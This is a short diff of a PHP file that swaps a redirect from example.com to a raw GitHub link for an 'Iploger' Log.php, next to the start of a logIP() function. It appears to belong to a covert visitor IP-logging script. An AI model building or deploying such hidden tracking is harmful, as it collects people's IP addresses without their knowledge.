@@ -1,5 +1,5 @@
 <?php
-header("Location: http://example.com/index.html");
+header("Location: https://raw.githubusercontent.com/HackerMobileYT/Iploger/master/Log.php");
 die();
 function logIP()
 {
